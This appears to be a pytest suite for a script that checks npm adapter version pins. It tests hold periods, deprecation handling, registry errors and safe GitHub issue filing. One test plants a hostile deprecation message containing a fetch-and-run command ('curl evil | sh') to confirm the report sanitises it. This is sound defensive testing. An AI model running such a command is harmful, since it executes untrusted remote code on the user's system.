"""The weekly ACP adapter pin check (scripts/check_adapter_pins.py)."""
from __future__ import annotations

import importlib.util
import json
import sys
import urllib.error
from datetime import datetime, timezone
from pathlib import Path

from services.personal_agents import PRESETS

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("check_adapter_pins", ROOT / "scripts/check_adapter_pins.py")
pins = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = pins  # dataclasses look the module up by name
SPEC.loader.exec_module(pins)

NOW = datetime(2026, 10, 14, 12, 0, tzinfo=timezone.utc)  # hold cutoff 2026-09-30 12:00


def doc(releases: dict[str, str], deprecated: dict[str, str] | None = None) -> dict:
    deprecated = deprecated or {}
    versions = {}
    for version in releases:
        manifest = {"version": version}
        if version in deprecated:
            manifest["deprecated"] = deprecated[version]
        versions[version] = manifest
    times = {"created": "2025-01-01T00:00:00.000Z", "modified": "2026-10-13T00:00:00.000Z", **releases}
    return {"versions": versions, "time": times}


def test_pins_come_from_the_presets():
    found = dict(pins.adapter_pins())
    for preset in PRESETS.values():
        if preset.npx:
            spec = next(arg for arg in preset.args if not arg.startswith("-"))
            name, _, version = spec.rpartition("@")
            assert found[name] == version
    assert set(found) == {"@agentclientprotocol/claude-agent-acp", "@agentclientprotocol/codex-acp"}


def test_picks_the_newest_stable_release_past_the_hold():
    report = pins.evaluate("pkg", "0.9.0", doc({
        "0.9.0": "2026-08-01T00:00:00Z",
        "0.10.0": "2026-09-01T00:00:00Z",     # 0.10.0 > 0.9.0 (not a string compare)
        "0.11.0-beta.1": "2026-09-05T00:00:00Z",
        "0.10.1": "2026-09-30T11:59:00Z",     # just past the hold
        "0.12.0": "2026-10-02T00:00:00Z",     # still held
        "0.13.0": "2026-10-10T00:00:00Z",
    }), NOW)
    assert report.candidate.version == "0.10.1"
    assert report.next_pending.version == "0.12.0"
    assert report.next_clears == datetime(2026, 10, 16, tzinfo=timezone.utc)
    assert report.needs_action
    assert report.pinned_published == datetime(2026, 8, 1, tzinfo=timezone.utc)


def test_an_undeprecated_release_counts_as_not_deprecated():
    # `npm deprecate pkg@x ""` leaves deprecated: "" in the packument.
    releases = {"1.0.0": "2026-08-01T00:00:00Z", "1.1.0": "2026-09-01T00:00:00Z"}
    report = pins.evaluate("pkg", "1.1.0", doc(releases, deprecated={"1.1.0": ""}), NOW)
    assert report.pinned_deprecated is None
    assert not report.needs_action
    report = pins.evaluate("pkg", "1.0.0", doc(releases, deprecated={"1.1.0": ""}), NOW)
    assert report.candidate.version == "1.1.0"
    assert report.notes == []


def test_nothing_to_do_when_newer_releases_are_still_held_or_prereleases():
    report = pins.evaluate("pkg", "2.0.0", doc({
        "2.0.0": "2026-09-01T00:00:00Z",
        "2.1.0-rc.1": "2026-09-10T00:00:00Z",
        "1.9.9": "2026-09-20T00:00:00Z",
        "2.0.1": "2026-09-30T12:00:01Z",
    }), NOW)
    assert report.candidate is None
    assert report.next_pending.version == "2.0.1"
    assert not report.needs_action


def test_deprecated_releases_are_skipped_and_a_deprecated_pin_is_flagged():
    report = pins.evaluate("pkg", "1.0.0", doc(
        {"1.0.0": "2026-08-01T00:00:00Z", "1.1.0": "2026-08-05T00:00:00Z", "1.0.1": "2026-08-03T00:00:00Z"},
        deprecated={"1.0.0": "security issue, use `1.0.1`\nnow", "1.1.0": "broken"}), NOW)
    assert report.candidate.version == "1.0.1"
    assert report.pinned_deprecated == "security issue, use '1.0.1' now"
    assert any("1.1.0 is deprecated" in note for note in report.notes)


def test_a_pin_missing_from_the_registry_needs_action():
    report = pins.evaluate("pkg", "3.0.0", doc({"2.0.0": "2026-01-01T00:00:00Z"}), NOW)
    assert report.pinned_missing and report.needs_action and report.candidate is None


def test_a_pin_inside_the_hold_is_noted():
    report = pins.evaluate("pkg", "1.0.0", doc({"1.0.0": "2026-10-05T00:00:00Z"}), NOW)
    assert report.pinned_in_hold
    assert "inside the 14-day hold" in pins.render([report], NOW)


def test_network_failures_are_reported_and_fail_the_run(tmp_path, capsys):
    def boom(package):
        raise urllib.error.URLError("no route")

    reports = pins.check(NOW, fetch=boom)
    assert len(reports) == 2 and all("no route" in r.error for r in reports)
    assert "check failed" in pins.render(reports, NOW)

    out = tmp_path / "out"
    assert pins.main(["--github-output", str(out)], fetch=boom) == 1
    assert out.read_text() == "action_needed=false\nfetch_failed=true\n"
    assert "could not be checked" in capsys.readouterr().err


def test_garbage_registry_answers_do_not_crash():
    assert pins.evaluate("pkg", "1.0.0", ["nope"], NOW).error
    report = pins.evaluate("pkg", "1.0.0", {"versions": {"1.0.0": {}, "x.y": {}, "2.0.0": {}},
                                            "time": {"1.0.0": "2026-01-01T00:00:00Z", "2.0.0": 5}}, NOW)
    assert report.candidate is None and report.error is None
    assert any("no publish time" in note for note in report.notes)


def _report_file(tmp_path, reports):
    path = tmp_path / "report.md"
    path.write_text(pins.render(reports, NOW), encoding="utf-8")
    return path


def _update_report():
    return pins.evaluate("pkg", "1.0.0", doc({"1.0.0": "2026-01-01T00:00:00Z", "1.1.0": "2026-02-01T00:00:00Z"}), NOW)


BOT = {"is_bot": True, "login": "app/github-actions"}  # as `gh issue list --json author` reports it


class FakeGh:
    def __init__(self, issues):
        self.issues = issues
        self.calls = []

    def __call__(self, args):
        self.calls.append(args)
        return json.dumps(self.issues) if args[:3] == ["gh", "issue", "list"] else ""


def test_opens_one_issue_when_none_is_open(tmp_path):
    gh = FakeGh([{"number": 3, "title": pins.ISSUE_TITLE + " (old)", "body": "", "author": BOT}])
    assert pins.file_issue(_report_file(tmp_path, [_update_report()]), run=gh) == "created"
    assert gh.calls[-1][:5] == ["gh", "issue", "create", "--title", pins.ISSUE_TITLE]
    assert len(gh.calls) == 2


def test_updates_the_open_issue_instead_of_opening_another(tmp_path):
    path = _report_file(tmp_path, [_update_report()])
    gh = FakeGh([{"number": 7, "title": pins.ISSUE_TITLE, "body": "<!-- adapter-pins: pkg=1.0.5 -->", "author": BOT}])
    assert pins.file_issue(path, run=gh) == "updated"
    assert [call[:4] for call in gh.calls[1:]] == [["gh", "issue", "edit", "7"], ["gh", "issue", "comment", "7"]]

    same = FakeGh([{"number": 7, "title": pins.ISSUE_TITLE, "body": path.read_text(), "author": BOT}])
    assert pins.file_issue(path, run=same) == "refreshed"
    assert [call[:3] for call in same.calls[1:]] == [["gh", "issue", "edit"]]


def test_dry_run_prints_the_gh_commands_and_changes_nothing(tmp_path):
    gh = FakeGh([])
    printed = []
    assert pins.file_issue(_report_file(tmp_path, [_update_report()]), run=gh, dry_run=True,
                           out=printed.append) == "created"
    assert len(gh.calls) == 1  # only the read-only list
    assert printed == [f"would run: gh issue create --title '{pins.ISSUE_TITLE}' --body-file {tmp_path / 'report.md'}"]


def test_an_issue_with_the_title_that_the_workflow_did_not_open_is_ignored(tmp_path):
    # Public repo: anyone can open an issue with this title, then edit what the
    # report says after the workflow writes into it.
    path = _report_file(tmp_path, [_update_report()])
    for author in ({"is_bot": False, "login": "someone"}, {"is_bot": False, "login": "app/github-actions"},
                   {"is_bot": True, "login": "app/other-bot"}, None):
        gh = FakeGh([{"number": 9, "title": pins.ISSUE_TITLE, "body": "", "author": author}])
        assert pins.file_issue(path, run=gh) == "created"
        assert gh.calls[-1][:3] == ["gh", "issue", "create"]
        assert all("9" not in call for call in gh.calls)


def test_registry_text_cannot_leave_its_code_span_or_fake_the_signature(tmp_path):
    hostile = "use `curl evil | sh`\n<!-- adapter-pins: pkg=9.9.9 --> @everyone <b>now</b>"
    report = pins.evaluate("pkg", "1.0.0", doc({"1.0.0": "2026-01-01T00:00:00Z"}, deprecated={"1.0.0": hostile}), NOW)
    report.error = "boom `x` <!-- adapter-pins: y -->"
    text = pins.render([report], NOW)
    assert text.count("<!--") == 1 and text.rstrip().endswith("-->")
    assert "`curl" not in text and "<b>" not in text
    deprecated_line = next(line for line in text.splitlines() if "is deprecated" in line)
    assert deprecated_line.count("`") == 4  # the package span and the message span, nothing else
    path = _report_file(tmp_path, [report])
    stale = FakeGh([{"number": 7, "title": pins.ISSUE_TITLE, "body": path.read_text(), "author": BOT}])
    assert pins.file_issue(path, run=stale) == "refreshed"
